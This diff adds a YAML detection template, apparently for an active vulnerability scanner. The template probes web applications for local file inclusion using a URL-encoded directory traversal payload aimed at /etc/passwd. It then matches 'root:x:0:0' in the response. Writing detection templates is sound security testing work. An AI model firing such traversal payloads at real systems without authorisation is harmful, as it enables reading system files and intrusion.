@@ -1,0 +1,23 @@
+id: patt-lfi-urlenc-01-file
+name: 'PATT lfi patt-lfi-urlenc-01 via file'
+severity: high
+type: active
+tags:
+  - lfi
+  - patt
+  - encodeurl
+requires:
+  - php
+  - java
+description: 'PATT URL Encoding: %2f for slash. [patt:patt-lfi-urlenc-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      file:
+        - '..%2f..%2f..%2fetc%2fpasswd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
